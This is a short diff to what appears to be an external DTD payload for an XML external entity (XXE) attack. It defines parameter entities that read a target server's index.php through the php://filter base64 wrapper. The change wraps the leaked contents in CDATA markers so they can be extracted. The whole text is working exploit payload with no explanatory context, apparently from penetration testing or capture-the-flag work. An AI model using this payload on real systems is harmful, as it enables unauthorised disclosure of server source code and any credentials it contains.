@@ -1,2 +1,4 @@
+<!ENTITY % start "<![CDATA[">
+<!ENTITY % end "]]>">
 <!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=index.php">
-<!ENTITY all "%file;">
+<!ENTITY all "%start;%file;%end;">
